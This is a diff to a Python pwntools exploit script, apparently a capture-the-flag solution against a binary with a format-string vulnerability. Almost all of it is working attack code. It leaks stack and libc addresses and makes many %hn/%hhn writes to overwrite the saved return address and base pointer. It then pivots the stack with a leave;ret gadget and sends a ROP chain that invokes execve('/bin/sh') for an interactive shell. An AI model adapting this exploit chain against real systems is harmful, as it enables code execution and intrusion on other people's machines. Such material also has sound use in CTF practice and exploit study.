@@ -22,20 +22,20 @@ p.recvuntil(b"give you one chance!!!\n")
 leak = p.recvline().strip().decode()
 leak = int(leak, 16)
 rip_pos = leak - 0x120
+
 print("Rip position: ", hex(rip_pos))
 
 # partial overwriting the first byte of return address of `printf` to 0x10, changing it to return to main+5
 bytes_to_write = rip_pos & 0xffff
 payload = f"%{bytes_to_write-4}c%c%c%c%c%hn".encode()
 written = bytes_to_write
-bytes_to_write = padding(written, 0x7e, 0x100) # max being 0x100 for hhn
+bytes_to_write = padding(written, 0x10, 0x100) # max being 0x100 for hhn
 payload += f"%{bytes_to_write}c%41$hhn".encode()
 
 p.recvuntil(b"begin your challenge\n")
 p.sendline(payload)
 
 
-p.interactive()
 payload = b"%19$p"
 
 p.recvuntil(b"give you one chance!!!\n")
@@ -49,6 +49,7 @@ print("Buf: ", hex(buf))
 
 
 rip_pos = rip_pos - 0x20
+
 bytes_to_write = rip_pos & 0xffff
 payload = f"%{bytes_to_write-8}c%c%c%c%c%c%c%c%c%hn".encode()
 written = bytes_to_write
@@ -82,25 +83,268 @@ p.sendline(payload)
 
 
 
-
+rbp_pos = rip_pos + 0x28 
 bytes_to_write = padding(0, 0x7e, 0x100) # max being 0x100 for hhn
 pos = int(0x158 / 8 + 6)
 payload = f"%{bytes_to_write}c%{pos}$hhn".encode()
 written = bytes_to_write
-rbp_pos = rip_pos + 0x28
 bytes_to_write = padding(written, rbp_pos & 0xffff, 0x10000)
 pos = int(0xf8 / 8 + 6)
 payload += f"%{bytes_to_write}c%{pos}$hn".encode()
-written += bytes_to_write
+payload += b'A' * 0x30
+
+p.recvuntil(b"begin your challenge\n")
+
+p.sendline(payload)
+
+
+
+buf = buf + 8
+bytes_to_write = padding(0, 0x7e, 0x100) # max being 0x100 for hhn
+pos = int(0x158 / 8 + 6)
+payload = f"%{bytes_to_write}c%{pos}$hhn".encode()
+written = bytes_to_write
 pos = int(0x168 / 8 + 6)
+print(hex(buf & 0xffff))
 bytes_to_write = padding(written, buf & 0xffff, 0x10000)
 payload += f"%{bytes_to_write}c%{pos}$hn".encode()
 written += bytes_to_write
 print(len(payload))
 
+
 p.recvuntil(b"begin your challenge\n")
-gdb.attach(p, s)
+
 p.sendline(payload)
 
+
+bytes_to_write = padding(0, 0x7e, 0x100) # max being 0x100 for hhn
+pos = int(0x158 / 8 + 6)
+payload = f"%{bytes_to_write}c%{pos}$hhn".encode()
+written = bytes_to_write
+bytes_to_write = padding(written, (rbp_pos + 2) & 0xffff, 0x10000)
+pos = int(0xf8 / 8 + 6)
+payload += f"%{bytes_to_write}c%{pos}$hn".encode()
+payload += b'A' * 0x30
+
+p.recvuntil(b"begin your challenge\n")
+
+p.sendline(payload)
+
+
+
+bytes_to_write = padding(0, 0x7e, 0x100) # max being 0x100 for hhn
+pos = int(0x158 / 8 + 6)
+payload = f"%{bytes_to_write}c%{pos}$hhn".encode()
+written = bytes_to_write
+pos = int(0x168 / 8 + 6)
+print(hex(buf & 0xffff))
+bytes_to_write = padding(written, (buf >> 16) & 0xffff, 0x10000)
+payload += f"%{bytes_to_write}c%{pos}$hn".encode()
+written += bytes_to_write
+print(len(payload))
+
+
+p.recvuntil(b"begin your challenge\n")
+
+p.sendline(payload)
+
+
+
+bytes_to_write = padding(0, 0x7e, 0x100) # max being 0x100 for hhn
+pos = int(0x158 / 8 + 6)
+payload = f"%{bytes_to_write}c%{pos}$hhn".encode()
+written = bytes_to_write
+bytes_to_write = padding(written, (rbp_pos + 4) & 0xffff, 0x10000)
+pos = int(0xf8 / 8 + 6)
+payload += f"%{bytes_to_write}c%{pos}$hn".encode()
+payload += b'A' * 0x30
+
+p.recvuntil(b"begin your challenge\n")
+
+p.sendline(payload)
+
+
+
+bytes_to_write = padding(0, 0x7e, 0x100) # max being 0x100 for hhn
+pos = int(0x158 / 8 + 6)
+payload = f"%{bytes_to_write}c%{pos}$hhn".encode()
+written = bytes_to_write
+pos = int(0x168 / 8 + 6)
+print(hex(buf & 0xffff))
+bytes_to_write = padding(written, (buf >> 32 )& 0xffff, 0x10000)
+payload += f"%{bytes_to_write}c%{pos}$hn".encode()
+written += bytes_to_write
+print(len(payload))
+
+
+p.recvuntil(b"begin your challenge\n")
+
+p.sendline(payload)
+
+
+
+leave_ret = buf - 0x4060 - 8 + 0x1409
+
+print(hex(leave_ret))
+bytes_to_write = padding(0, 0x7e, 0x100) # max being 0x100 for hhn
+pos = int(0x158 / 8 + 6)
+payload = f"%{bytes_to_write}c%{pos}$hhn".encode()
+written = bytes_to_write
+bytes_to_write = padding(written, (rbp_pos + 8) & 0xffff, 0x10000)
+pos = int(0xf8 / 8 + 6)
+payload += f"%{bytes_to_write}c%{pos}$hn".encode()
+payload += b'A' * 0x30
+
+p.recvuntil(b"begin your challenge\n")
+
+p.sendline(payload)
+
+
+
+
+bytes_to_write = padding(0, 0x7e, 0x100) # max being 0x100 for hhn
+pos = int(0x158 / 8 + 6)
+payload = f"%{bytes_to_write}c%{pos}$hhn".encode()
+written = bytes_to_write
+pos = int(0x168 / 8 + 6)
+print(hex(buf & 0xffff))
+bytes_to_write = padding(written, leave_ret & 0xffff, 0x10000)
+payload += f"%{bytes_to_write}c%{pos}$hn".encode()
+written += bytes_to_write
+print(len(payload))
+
+
+p.recvuntil(b"begin your challenge\n")
+
+p.sendline(payload)
+
+
+
+bytes_to_write = padding(0, 0x7e, 0x100) # max being 0x100 for hhn
+pos = int(0x158 / 8 + 6)
+payload = f"%{bytes_to_write}c%{pos}$hhn".encode()
+written = bytes_to_write
+bytes_to_write = padding(written, (rbp_pos + 10) & 0xffff, 0x10000)
+pos = int(0xf8 / 8 + 6)
+payload += f"%{bytes_to_write}c%{pos}$hn".encode()
+payload += b'A' * 0x30
+
+p.recvuntil(b"begin your challenge\n")
+
+p.sendline(payload)
+
+
+
+bytes_to_write = padding(0, 0x7e, 0x100) # max being 0x100 for hhn
+pos = int(0x158 / 8 + 6)
+payload = f"%{bytes_to_write}c%{pos}$hhn".encode()
+written = bytes_to_write
+pos = int(0x168 / 8 + 6)
+print(hex(buf & 0xffff))
+bytes_to_write = padding(written, (leave_ret >> 16)& 0xffff, 0x10000)
+payload += f"%{bytes_to_write}c%{pos}$hn".encode()
+written += bytes_to_write
+print(len(payload))
+
+
+p.recvuntil(b"begin your challenge\n")
+
+p.sendline(payload)
+
+
+
+bytes_to_write = padding(0, 0x7e, 0x100) # max being 0x100 for hhn
+pos = int(0x158 / 8 + 6)
+payload = f"%{bytes_to_write}c%{pos}$hhn".encode()
+written = bytes_to_write
+bytes_to_write = padding(written, (rbp_pos + 12) & 0xffff, 0x10000)
+pos = int(0xf8 / 8 + 6)
+payload += f"%{bytes_to_write}c%{pos}$hn".encode()
+payload += b'A' * 0x30
+
+p.recvuntil(b"begin your challenge\n")
+
+p.sendline(payload)
+
+
+
+bytes_to_write = padding(0, 0x7e, 0x100) # max being 0x100 for hhn
+pos = int(0x158 / 8 + 6)
+payload = f"%{bytes_to_write}c%{pos}$hhn".encode()
+written = bytes_to_write
+pos = int(0x168 / 8 + 6)
+print(hex(buf & 0xffff))
+bytes_to_write = padding(written, (leave_ret >> 32)& 0xffff, 0x10000)
+payload += f"%{bytes_to_write}c%{pos}$hn".encode()
+written += bytes_to_write
+print(len(payload))
+
+
+p.recvuntil(b"begin your challenge\n")
+p.sendline(payload)
+
+
+
+
+bytes_to_write = padding(0, 0x7e, 0x100) # max being 0x100 for hhn
+pos = int(0x158 / 8 + 6)
+payload = f"%{bytes_to_write}c%{pos}$hhn".encode()
+written = bytes_to_write
+bytes_to_write = padding(written, (rbp_pos + 14) & 0xffff, 0x10000)
+pos = int(0xf8 / 8 + 6)
+payload += f"%{bytes_to_write}c%{pos}$hn".encode()
+payload += b'A' * 0x30
+
+p.recvuntil(b"begin your challenge\n")
+
+p.sendline(payload)
+
+
+
+bytes_to_write = padding(0, 0x7e, 0x100) # max being 0x100 for hhn
+pos = int(0x158 / 8 + 6)
+payload = f"%{bytes_to_write}c%{pos}$hhn".encode()
+written = bytes_to_write
+pos = int(0x168 / 8 + 6)
+print(hex(buf & 0xffff))
+bytes_to_write = padding(written, 0 & 0xffff, 0x10000)
+payload += f"%{bytes_to_write}c%{pos}$hn".encode()
+written += bytes_to_write
+print(len(payload))
+
+
+p.recvuntil(b"begin your challenge\n")
+
+p.sendline(payload)
+
+
+
+bytes_to_write = padding(0, 0x9, 0x100) # max being 0x100 for hhn
+pos = int(0x158 / 8 + 6)
+payload = f"%{bytes_to_write}c%{pos}$hhn------".encode()
+
+
+# gadgets
+
+pop_rdi = libc_base + 0x0000000000023b6a
+pop_rax = libc_base + 0x0000000000036174
+leave_ret = libc_base + 0x00000000000578c8
+syscall = libc_base + 0x000000000002284d
+bin_sh_addr = libc_base + 0x1b45bd
+pop_rsi = libc_base + 0x000000000002601f
+pop_rdx_r12 = libc_base + 0x0000000000119431
+system = libc_base + libc.sym['system'] # doesn't work
+
+payload += p64(pop_rdi)
+payload += p64(bin_sh_addr)
+payload += p64(pop_rax)
+payload += p64(0x3b)
+payload += p64(pop_rsi)
+payload += p64(0)
+payload += p64(syscall)
+
+
+gdb.attach(p, s)
+p.sendline(payload)
 
 p.interactive()
